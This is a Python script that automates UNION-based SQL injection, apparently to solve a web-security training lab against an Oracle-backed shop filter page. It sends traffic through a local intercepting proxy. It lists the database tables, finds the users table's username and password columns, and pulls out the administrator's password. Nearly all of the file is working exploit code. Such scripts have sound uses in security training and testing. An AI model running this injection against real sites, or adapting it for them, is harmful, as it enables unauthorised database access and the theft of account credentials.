
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

path = "/filter?category=Gifts"

def request_perform(url, sql_payload):
    r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    return r.text


def sqli_users_table(url):
    sqli_payload = "' union select table_name,null from all_tables--"
    res = request_perform(url,sqli_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))
    if users_table:
        return users_table
    else:
        return False

def exploit_users_column(url, users_table):
    sqli_payload = f"' union select column_name,null from all_tab_columns where table_name='{users_table}'--"
    res = request_perform(url,sqli_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return username_column, password_column


def exploit_admin_cred(url, username_column, password_column, users_table):
    sqli_payload = f"' UNION select {username_column}, {password_column} from {users_table}--"
    res = request_perform(url, sqli_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(text='administrator').parent.findNext('td').contents[0]
    return admin_password


if __name__ == "__main__":
    try: 
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} <url>")
        print(f"[*] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    users_table = sqli_users_table(url)

    if users_table:
        print(f"The users table is: {users_table} .")

        username_column, password_column = exploit_users_column(url, users_table)

        if username_column and password_column:
            print(f"The username column is {username_column}.")
            print(f"The password column is {password_column}.")

            admin_password = exploit_admin_cred(url, username_column, password_column, users_table)
            if admin_password:
                print(f"The administrator password is {admin_password}.")
            else:
                print("Didnot find administrator password.")
        else:
            print("Didnot find any username/password column.")
    else:
        print("Didnot find users table.")